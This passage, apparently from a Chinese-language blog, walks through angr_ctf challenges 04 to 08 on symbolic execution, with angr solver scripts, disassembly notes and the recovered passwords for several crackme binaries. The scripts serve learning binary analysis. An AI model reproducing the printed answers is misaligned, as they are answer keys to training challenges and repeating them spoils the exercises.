project.factory.simgr(initial_state)<br><br>    print_good_address = <span class="hljs-number">0x080486E9</span><br><br>    simulation.explore(find=print_good_address)<br><br>    <span class="hljs-keyword">if</span> simulation.found:<br>        solution_state = simulation.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br>    <br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main(sys.argv)<br></code></pre></td></tr></table></figure><p>得到正确输入</p><p><img src="/../images/angr/04.1.png"></p><p>这道题是在学习符号化栈</p><p><img src="/../images/angr/04.2.png"></p><p>Angr 代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">argv</span>):<br>    path_to_binary = <span class="hljs-string">&quot;./04_angr_symbolic_stack&quot;</span><br>    project = angr.Project(path_to_binary)<br><br>    <span class="hljs-comment"># 从scanf调用完成且栈清理后开始</span><br>    start_address = <span class="hljs-number">0x08048697</span>  <span class="hljs-comment"># mov eax, dword [ebp-0xc]</span><br>    initial_state = project.factory.blank_state(addr=start_address)<br><br>    <span class="hljs-comment"># 设置栈帧</span><br>    <span class="hljs-comment"># 08048679  55                 push    ebp           ; 保存旧的ebp</span><br>    <span class="hljs-comment"># 0804867a  89e5               mov     ebp, esp      ; 设置新的栈帧基址</span><br>    <span class="hljs-comment"># 0804867c  83ec18             sub     esp, 0x18     ; 为局部变量分配栈空间</span><br>    initial_state.regs.ebp = initial_state.regs.esp + <span class="hljs-number">0x18</span><br><br>    <span class="hljs-comment"># 创建符号变量</span><br>    password0 = claripy.BVS(<span class="hljs-string">&#x27;password0&#x27;</span>, <span class="hljs-number">32</span>)<br>    password1 = claripy.BVS(<span class="hljs-string">&#x27;password1&#x27;</span>, <span class="hljs-number">32</span>)<br><br>    <span class="hljs-comment"># 从汇编可以看出：</span><br>    <span class="hljs-comment"># password0 位于 ebp - 0xc 到 ebp - 0x9 (4字节)</span><br>    <span class="hljs-comment"># password1 位于 ebp - 0x10 到 ebp - 0xd (4字节)</span><br>    <span class="hljs-comment"># 用 .memory.store() 主动把符号变量写入栈中对应的位置</span><br>    initial_state.memory.store(initial_state.regs.ebp - <span class="hljs-number">0xc</span>, password0, endness=<span class="hljs-string">&#x27;Iend_LE&#x27;</span>)  <span class="hljs-comment"># 指定字节序列为小端序</span><br>    initial_state.memory.store(initial_state.regs.ebp - <span class="hljs-number">0x10</span>, password1, endness=<span class="hljs-string">&#x27;Iend_LE&#x27;</span>)<br><br>    simulation = project.factory.simgr(initial_state)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">is_successful</span>(<span class="hljs-params">state</span>):<br>        stdout_output = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> stdout_output<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">should_abort</span>(<span class="hljs-params">state</span>):<br>        stdout_output = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> stdout_output<br><br>    simulation.explore(find=is_successful, avoid=should_abort)<br><br>    <span class="hljs-keyword">if</span> simulation.found:<br>        solution_state = simulation.found[<span class="hljs-number">0</span>]<br>        solution0 = solution_state.solver.<span class="hljs-built_in">eval</span>(password0)<br>        solution1 = solution_state.solver.<span class="hljs-built_in">eval</span>(password1)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;solution0&#125;</span> <span class="hljs-subst">&#123;solution1&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main(sys.argv)<br><br><span class="hljs-comment"># 1704280884 2382341151</span><br></code></pre></td></tr></table></figure><h3 id="05-angr-symbolic-memory"><a href="#05-angr-symbolic-memory" class="headerlink" title="05_angr_symbolic_memory"></a>05_angr_symbolic_memory</h3><p><img src="/../images/angr/05.png"></p><p>直接用 print_good_address &#x3D; 0x08048672 依旧可以得到正确输入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">argv</span>):<br>    path_to_binary = <span class="hljs-string">&quot;./05_angr_symbolic_memory&quot;</span><br>    project = angr.Project(path_to_binary)<br><br>    initial_state = project.factory.entry_state(<br>        add_options = &#123;<br>            angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,<br>            angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS<br>        &#125;<br>    )<br><br>    simulation = project.factory.simgr(initial_state)<br><br>    print_good_address = <span class="hljs-number">0x08048672</span>  <br><br>    simulation.explore(find=print_good_address)<br><br>    <span class="hljs-keyword">if</span> simulation.found:<br>        solution_state = simulation.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br>    <br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main(sys.argv)<br></code></pre></td></tr></table></figure><p><img src="/../images/angr/05.0.png"></p><p>这道题是在学习符号化内存,本质上是在符号化 .bss 段（未初始化的全局变量）</p><p>Angr 代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">argv</span>):<br>    path_to_binary = <span class="hljs-string">&quot;./05_angr_symbolic_memory&quot;</span><br>    project = angr.Project(path_to_binary)<br><br>    start_address = <span class="hljs-number">0x08048601</span><br>    initial_state = project.factory.blank_state(<br>    addr=start_address,<br>    add_options = &#123; angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,<br>                    angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS&#125;<br>  )<br><br>    password0 = claripy.BVS(<span class="hljs-string">&#x27;password0&#x27;</span>, <span class="hljs-number">64</span>)<br>    password1 = claripy.BVS(<span class="hljs-string">&#x27;password1&#x27;</span>, <span class="hljs-number">64</span>)<br>    password2 = claripy.BVS(<span class="hljs-string">&#x27;password2&#x27;</span>, <span class="hljs-number">64</span>)<br>    password3 = claripy.BVS(<span class="hljs-string">&#x27;password3&#x27;</span>, <span class="hljs-number">64</span>)<br><br><br>    <span class="hljs-comment"># 080485e0  68d8a11b0a         push    0xa1ba1d8 &#123;var_30&#125;</span><br>    <span class="hljs-comment"># 080485e5  68d0a11b0a         push    0xa1ba1d0 &#123;var_34&#125;</span><br>    <span class="hljs-comment"># 080485ea  68c8a11b0a         push    0xa1ba1c8 &#123;var_38&#125;</span><br>    <span class="hljs-comment"># 080485ef  68c0a11b0a         push    user_input &#123;var_3c&#125;</span><br><br>    password0_address = <span class="hljs-number">0xa1ba1c0</span> <span class="hljs-comment"># user_input</span><br>    initial_state.memory.store(password0_address, password0)<br><br>    password1_address = <span class="hljs-number">0xa1ba1c8</span><br>    initial_state.memory.store(password1_address, password1)<br><br>    password2_address = <span class="hljs-number">0xa1ba1d0</span><br>    initial_state.memory.store(password2_address, password2)<br><br>    password3_address = <span class="hljs-number">0xa1ba1d8</span><br>    initial_state.memory.store(password3_address, password3)<br><br>    simulation = project.factory.simgr(initial_state)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">is_successful</span>(<span class="hljs-params">state</span>):<br>        stdout_output = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> stdout_output<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">should_abort</span>(<span class="hljs-params">state</span>):<br>        stdout_output = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> stdout_output<br><br>    simulation.explore(find=is_successful, avoid=should_abort)<br><br>    <span class="hljs-keyword">if</span> simulation.found:<br>        solution_state = simulation.found[<span class="hljs-number">0</span>]<br><br>        solution0 = solution_state.solver.<span class="hljs-built_in">eval</span>(password0, cast_to=<span class="hljs-built_in">bytes</span>) <span class="hljs-comment"># 指定输出类型为字节型</span><br>        solution1 = solution_state.solver.<span class="hljs-built_in">eval</span>(password1, cast_to=<span class="hljs-built_in">bytes</span>)<br>        solution2 = solution_state.solver.<span class="hljs-built_in">eval</span>(password2, cast_to=<span class="hljs-built_in">bytes</span>)<br>        solution3 = solution_state.solver.<span class="hljs-built_in">eval</span>(password3, cast_to=<span class="hljs-built_in">bytes</span>)<br>        <br>        <span class="hljs-comment"># 去掉空字节并解码为字符串</span><br>        solution = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;solution0.rstrip(<span class="hljs-string">b&#x27;\\x00&#x27;</span>).decode()&#125;</span> <span class="hljs-subst">&#123;solution1.rstrip(<span class="hljs-string">b&#x27;\\x00&#x27;</span>).decode()&#125;</span> <span class="hljs-subst">&#123;solution2.rstrip(<span class="hljs-string">b&#x27;\\x00&#x27;</span>).decode()&#125;</span> <span class="hljs-subst">&#123;solution3.rstrip(<span class="hljs-string">b&#x27;\\x00&#x27;</span>).decode()&#125;</span>&quot;</span><br>        <span class="hljs-built_in">print</span>(solution)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main(sys.argv)<br>    <br><span class="hljs-comment"># NAXTHGNR JVSFTPWE LMGAUHWC XMDCPAL</span><br></code></pre></td></tr></table></figure><h3 id="06-angr-symbolic-dynamic-memory"><a href="#06-angr-symbolic-dynamic-memory" class="headerlink" title="06_angr_symbolic_dynamic_memory"></a>06_angr_symbolic_dynamic_memory</h3><p><img src="/../images/angr/06.png"></p><p>用 print_good_address &#x3D; 0x0804875e 可以得到正确输入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">argv</span>):<br>    path_to_binary = <span class="hljs-string">&quot;./06_angr_symbolic_dynamic_memory&quot;</span><br>    project = angr.Project(path_to_binary)<br><br>    initial_state = project.factory.entry_state(<br>        add_options = &#123;<br>            angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,<br>            angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS<br>        &#125;<br>    )<br><br>    simulation = project.factory.simgr(initial_state)<br><br>    print_good_address = <span class="hljs-number">0x0804875e</span><br><br>    simulation.explore(find=print_good_address)<br><br>    <span class="hljs-keyword">if</span> simulation.found:<br>        solution_state = simulation.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br>    <br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main(sys.argv)<br></code></pre></td></tr></table></figure><p><img src="/../images/angr/06.0.png"></p><p>从汇编中可以看出，这道题的输入不是直接存储在栈上，而是通过 malloc 动态分配内存，然后将输入存储在这些动态分配的内存中</p><p><img src="/../images/angr/06.1.png"></p><p>这就需要符号化动态内存<br>伪造一个地址，指向任意未使用的内存区域，<br>Angr 代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">argv</span>):<br>    path_to_binary = <span class="hljs-string">&quot;./06_angr_symbolic_dynamic_memory&quot;</span><br>    project = angr.Project(path_to_binary)<br><br>    start_address = <span class="hljs-number">0x08048699</span> <span class="hljs-comment">#  mov  dword [ebp-0xc &#123;i&#125;], 0x0</span><br>    initial_state = project.factory.blank_state(<br>    addr=start_address,<br>    add_options = &#123; angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,<br>                    angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS&#125;<br>  )<br>    <br>    password0 = claripy.BVS(<span class="hljs-string">&#x27;password0&#x27;</span>, <span class="hljs-number">64</span>)<br>    password1 = claripy.BVS(<span class="hljs-string">&#x27;password1&#x27;</span>, <span class="hljs-number">64</span>)<br><br>    <span class="hljs-comment"># 在 x86 汇编中:</span><br>    <span class="hljs-comment"># a3 a4c8bc0a = mov [0xabc8a4], eax</span><br>    <span class="hljs-comment"># a1 a4c8bc0a = mov eax, [0xabc8a4]</span><br><br>    <span class="hljs-comment"># 伪造堆地址 - 选择任意未使用的内存区域</span><br>    fake_heap_address0 = <span class="hljs-number">0x10000000</span><br>    fake_heap_address1 = <span class="hljs-number">0x10000010</span><br><br><br>    <span class="hljs-comment"># 08048623  e8e8fdffff         call    malloc        ; 第一次malloc调用</span><br>    <span class="hljs-comment"># 08048628  83c410             add     esp, 0x10</span><br>    <span class="hljs-comment"># 0804862b  a3a4c8bc0a         mov     dword [buffer0], eax  </span><br><br>    <span class="hljs-comment"># 08048635  e8d6fdffff         call    malloc        ; 第二次malloc调用  </span><br>    <span class="hljs-comment"># 0804863a  83c410             add     esp, 0x10</span><br>    <span class="hljs-comment"># 0804863d  a3acc8bc0a         mov     dword [buffer1], eax  </span><br><br>    pointer_to_malloc_memory_address0 = <span class="hljs-number">0xabc8a4</span>  <span class="hljs-comment"># buffer0</span><br>    pointer_to_malloc_memory_address1 = <span class="hljs-number">0xabc8ac</span>  <span class="hljs-comment"># buffer1</span><br><br>    <span class="hljs-comment"># 将全局指针指向伪造的堆地址</span><br>    initial_state.memory.store(pointer_to_malloc_memory_address0, fake_heap_address0, endness=project.arch.memory_endness)<br>    initial_state.memory.store(pointer_to_malloc_memory_address1, fake_heap_address1, endness=project.arch.memory_endness)<br><br>    <span class="hljs-comment"># 将符号值存储在伪造的堆地址处</span><br>    <span class="hljs-comment"># scanf会将输入存储在这些地址</span><br>    initial_state.memory.store(fake_heap_address0, password0)<br>    initial_state.memory.store(fake_heap_address1, password1)<br><br>    simulation = project.factory.simgr(initial_state)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">is_successful</span>(<span class="hljs-params">state</span>):<br>        stdout_output = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> stdout_output<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">should_abort</span>(<span class="hljs-params">state</span>):<br>        stdout_output = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> stdout_output<br><br>    simulation.explore(find=is_successful, avoid=should_abort)<br><br>    <span class="hljs-keyword">if</span> simulation.found:<br>        solution_state = simulation.found[<span class="hljs-number">0</span>]<br><br>        solution0 = solution_state.solver.<span class="hljs-built_in">eval</span>(password0, cast_to=<span class="hljs-built_in">bytes</span>)<br>        solution1 = solution_state.solver.<span class="hljs-built_in">eval</span>(password1, cast_to=<span class="hljs-built_in">bytes</span>)<br><br>        solution = solution0.decode() + <span class="hljs-string">&#x27; &#x27;</span> + solution1.decode()<br>        <span class="hljs-built_in">print</span>(solution)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main(sys.argv)<br></code></pre></td></tr></table></figure><blockquote><p>从上面的几个例子也能看到有的地方新版的 angr 已经可以自动符号化，不需要手动创建符号化</p></blockquote><h3 id="07-angr-symbolic-file"><a href="#07-angr-symbolic-file" class="headerlink" title="07_angr_symbolic_file"></a>07_angr_symbolic_file</h3><p>这个挑战和其他的不同，涉及到文件操作</p><p><img src="/../images/angr/07.png"></p><p>其中 ignore_me 函数是将用户从控制台的输入写入一个文件（OJKSQYDP.txt），在 main 函数中通过 fread 从这个文件读取数据并进行验证</p><p>需要做的是：</p><ol><li>确定程序中 <code>fread</code> 从哪个文件读取数据</li><li>使用 Angr 模拟文件系统，并用自定义的文件来替换真实文件</li><li>用符号变量初始化这个文件，使其被 fread 读取并传播到程序的执行状态中</li><li>使用 Angr 求解器来计算出正确的符号输入</li></ol><p>Angr 代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr <br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">argv</span>):<br>    path_to_binary = <span class="hljs-string">&quot;./07_angr_symbolic_file&quot;</span><br>    project = angr.Project(path_to_binary)<br><br>    <span class="hljs-comment"># 起始地址选在调用 ignore_me 函数之后</span><br>    start_address = <span class="hljs-number">0x080488d6</span><br>    initial_state = project.factory.blank_state(<br>        addr=start_address,<br>        add_options = &#123; <br>            angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,<br>            angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS<br>        &#125;<br>    )<br>  <br>    filename = <span class="hljs-string">&quot;OJKSQYDP.txt&quot;</span><br>    symbolic_file_size_bytes = <span class="hljs-number">64</span><br><br>    <span class="hljs-comment"># 创建符号位向量作为密码</span><br>    password = claripy.BVS(<span class="hljs-string">&#x27;password&#x27;</span>, symbolic_file_size_bytes * <span class="hljs-number">8</span>)<br>    <br>    <span class="hljs-comment"># 创建一个模拟文件系统</span><br>    password_file = angr.SimFile(filename, content=password)<br>    <br>    <span class="hljs-comment"># 将文件添加到文件系统</span><br>    initial_state.fs.insert(filename, password_file)<br><br>    simulation = project.factory.simgr(initial_state)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">is_successful</span>(<span class="hljs-params">state</span>):<br>        stdout_output = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> stdout_output<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">should_abort</span>(<span class="hljs-params">state</span>):<br>        stdout_output = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> stdout_output<br><br>    simulation.explore(find=is_successful, avoid=should_abort)<br><br>    <span class="hljs-keyword">if</span> simulation.found:<br>        solution_state = simulation.found[<span class="hljs-number">0</span>]<br>        <br>        solution_bytes = solution_state.solver.<span class="hljs-built_in">eval</span>(password, cast_to=<span class="hljs-built_in">bytes</span>)<br>        <br>        printable_chars = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(b) <span class="hljs-keyword">if</span> <span class="hljs-number">32</span> &lt;= b &lt;= <span class="hljs-number">126</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;.&#x27;</span> <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> solution_bytes)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Solution (printable): &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(printable_chars))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main(sys.argv)<br></code></pre></td></tr></table></figure><p>运行结果</p><p><img src="/../images/angr/07.1.png"></p><h3 id="08-angr-constraints"><a href="#08-angr-constraints" class="headerlink" title="08_angr_constraints"></a>08_angr_constraints</h3><p><img src="/../images/angr/08.png"></p><p><img src="/../images/angr/08.0.png"></p><p>check 函数是这种模式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">check_equals_AABBCCDDEEFFGGHH</span><span class="hljs-params">(<span class="hljs-type">char</span>* to_check, <span class="hljs-type">size_t</span> length)</span> &#123;<br>  <span class="hljs-type">uint32_t</span> num_correct = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>    <span class="hljs-keyword">if</span> (to_check[i] == REFERENCE_PASSWORD[i]) &#123;  <span class="hljs-comment">// 每个字符一一对比</span><br>      num_correct += <span class="hljs-number">1</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> num_correct == length;  <span class="hljs-comment">// 只有全部相等才返回真</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这道题里面的比较函数是逐字符比较的，虽然和 strcmp(to_check, “AABBCCDDEEFFGGHH”) &#x3D;&#x3D; 0 是同样的效果，但是用 angr 进行符号执行时，每一个要比较的字符 to_check[i] 都是一个未知的符号变量，所以这个 if 是一个分支点，每比较一种字符都有两种可能的路经（相等或不相等），这里长度是 16，总共有 2^16 &#x3D; 65536 种可能的路径，这就产生了 angr 中的一个问题: <strong>路径爆炸</strong>，路径爆炸会导致符号执行变得非常慢，甚至无法在合理时间内完成</p><p>要解决这个问题，可以使用 angr 